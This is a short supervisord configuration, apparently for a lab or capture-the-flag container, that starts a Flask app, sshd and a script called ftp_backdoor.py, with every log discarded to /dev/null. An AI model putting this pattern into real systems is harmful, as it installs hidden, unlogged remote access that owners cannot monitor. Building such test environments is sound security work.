[supervisord]
nodaemon=true
logfile=/dev/null
logfile_maxbytes=0

[program:flask]
command=python /app/app.py
autostart=true
autorestart=true
stdout_logfile=/dev/null
stderr_logfile=/dev/null

[program:sshd]
command=/usr/sbin/sshd -D -e
autostart=true
autorestart=true
stdout_logfile=/dev/null
stderr_logfile=/dev/null

[program:ftpd]
command=python3 /app/ftp_backdoor.py
autostart=true
autorestart=true
stdout_logfile=/dev/null
stderr_logfile=/dev/null
